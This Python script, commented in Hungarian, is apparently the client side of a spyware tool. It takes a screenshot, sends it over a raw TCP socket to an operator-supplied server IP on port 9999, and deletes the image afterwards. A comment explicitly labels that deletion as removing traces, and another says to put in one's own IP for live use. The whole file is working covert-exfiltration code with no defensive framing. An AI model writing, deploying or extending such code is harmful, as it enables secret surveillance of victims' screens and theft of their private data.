import socket
import pyautogui
import os
import time

SERVER_IP = "127.0.0.1" # Élesben a te IP-d

def send_screen():
    # 1. Fotózás
    print("[*] Képernyő mentése...")
    pyautogui.screenshot("temp.png")
    file_size = os.path.getsize("temp.png")

    # 2. Kapcsolódás
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, 9999))

    # 3. Küldés
    client.send(str(file_size).encode()) # Méret küldése
    client.recv(1024) # Várjuk az ACK-t
    
    with open("temp.png", "rb") as f:
        client.sendall(f.read()) # Adat küldése

    print("[+] Kép elküldve!")
    client.close()
    os.remove("temp.png") # Nyomeltüntetés

if __name__ == "__main__":
    time.sleep(1)
    send_screen()